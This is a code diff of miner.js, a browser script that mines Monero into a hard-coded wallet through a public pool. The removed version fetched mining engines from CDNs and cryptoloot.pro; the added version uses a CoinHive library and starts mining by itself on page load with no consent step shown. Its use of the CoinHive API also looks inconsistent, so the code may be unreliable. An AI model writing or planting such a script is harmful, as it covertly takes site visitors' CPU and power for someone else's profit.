@@ -1,106 +1,72 @@
-// miner.js - Multi-source miner for Android and Desktop
-// This script tries multiple public CDNs to find a working WebAssembly engine.
+// miner.js - Controller for the Coin-Hive Stratum miner
 
 (function() {
     'use strict';
 
     // --- CONFIGURATION ---
-    const CONFIG = {
-        wallet: "41dynwSJuzse2CknZhxrFaZYgZ1NwYg1fFpecWkrwWNyTeKDbrBKjinR9TTNnuPYh8a6MQXUhVwh7BvEpXdeFab3QcjPSVH", // <-- PASTE YOUR WALLET ADDRESS HERE
-        pool: {
-            host: "pool.supportxmr.com",
-            port: 3333,
-            tls: false
-        },
-        threads: 2, // Use 2 threads on mobile
-        throttle: 0.7 // Use 30% CPU
-    };
-
-    // --- LIST OF PUBLIC SOURCES TO TRY ---
-    // We will try these URLs one by one until we find one that works.
-    const WASM_SOURCES = [
-        {
-            workerUrl: "https://unpkg.com/@xmrig/core-wasm@latest/dist/worker.js",
-            wasmUrl: "https://unpkg.com/@xmrig/core-wasm@latest/dist/xmrig.wasm"
-        },
-        {
-            workerUrl: "https://cdn.jsdelivr.net/npm/@xmrig/core-wasm@latest/dist/worker.js",
-            wasmUrl: "https://cdn.jsdelivr.net/npm/@xmrig/core-wasm@latest/dist/xmrig.wasm"
-        },
-        {
-            // Fallback to an older, known working package
-            workerUrl: "https://cryptoloot.pro/lib/worker.js",
-            wasmUrl: "https://cryptoloot.pro/lib/xmrig.wasm"
-        }
-    ];
+    const WALLET = "41dynwSJuzse2CknZhxrFaZYgZ1NwYg1fFpecWkrwWNyTeKDbrBKjinR9TTNnuPYh8a6MQXUhVwh7BvEpXdeFab3QcjPSVH"; // <-- PASTE YOUR WALLET ADDRESS HERE
+    const POOL_HOST = "pool.supportxmr.com";
+    const POOL_PORT = 3333;
 
     // --- DO NOT EDIT BELOW THIS LINE ---
 
-    let currentSourceIndex = 0;
+    // This will be our miner object
     let miner = null;
 
-    function tryNextSource() {
-        if (currentSourceIndex >= WASM_SOURCES.length) {
-            console.error("FATAL: All mining engine sources failed. The miner cannot start.");
+    // Function to start the miner
+    function startMiner() {
+        console.log("Starting Coin-Hive Stratum miner for wallet: " + WALLET);
+
+        // The Coin-Hive library creates a global 'CoinHive' object
+        if (typeof CoinHive === 'undefined') {
+            console.error("FATAL: CoinHive library not loaded. Did you upload coin-hive.min.js?");
             return;
         }
 
-        const source = WASM_SOURCES[currentSourceIndex];
-        console.log(`Trying source ${currentSourceIndex + 1}: ${source.workerUrl}`);
+        // Create the miner
+        miner = new CoinHive.User(WALLET, {
+            pool: {
+                host: POOL_HOST,
+                port: POOL_PORT
+            },
+            throttle: 0.7, // Use 30% CPU
+            threads: navigator.hardwareConcurrency || 2
+        });
 
-        try {
-            // Terminate previous worker if it exists
-            if (miner) {
-                miner.terminate();
-            }
+        // Listen for events
+        miner.on('open', function() {
+            console.log("Connection to pool established.");
+        });
 
-            miner = new Worker(source.workerUrl);
+        miner.on('authed', function(params) {
+            console.log("Authenticated with pool. Worker ID:", params.id);
+        });
 
-            miner.onmessage = function(e) {
-                const data = e.data;
-                if (!data) return;
+        miner.on('close', function() {
+            console.log("Connection to pool closed.");
+        });
 
-                switch (data.type) {
-                    case 'ready':
-                        console.log("Miner engine is ready. Sending configuration...");
-                        miner.postMessage({
-                            type: 'start',
-                            payload: { ...CONFIG, ...source } // Merge config with source URLs
-                        });
-                        break;
-                    case 'hashrate':
-                        console.log("Hashrate: " + data.hashes + " H/s");
-                        break;
-                    case 'error':
-                        console.error("Miner Error:", data.error);
-                        // If the worker reports an error, try the next source
-                        currentSourceIndex++;
-                        tryNextSource();
-                        break;
-                }
-            };
+        miner.on('error', function(params) {
+            console.error("Miner Error:", params.error);
+        });
 
-            miner.onerror = function(error) {
-                console.error(`Worker failed for source ${currentSourceIndex + 1}:`, error.message);
-                // If the worker fails to load, try the next source
-                currentSourceIndex++;
-                tryNextSource();
-            };
+        miner.on('job', function(params) {
+            // console.log("New job received.");
+        });
 
-            // Send initial configuration to the worker
-            miner.postMessage({
-                type: 'init',
-                payload: { ...CONFIG, ...source }
-            });
+        miner.on('found', function(params) {
+            console.log("Hash found!");
+        });
 
-        } catch (e) {
-            console.error(`Failed to create worker for source ${currentSourceIndex + 1}:`, e);
-            currentSourceIndex++;
-            tryNextSource();
-        }
+        miner.on('accepted', function(params) {
+            console.log("Hash accepted by pool.");
+        });
+
+        // Start mining
+        miner.start();
     }
 
-    // Start the process by trying the first source
-    tryNextSource();
+    // Wait for the page to load, then start the miner
+    window.onload = startMiner;
 
 })();
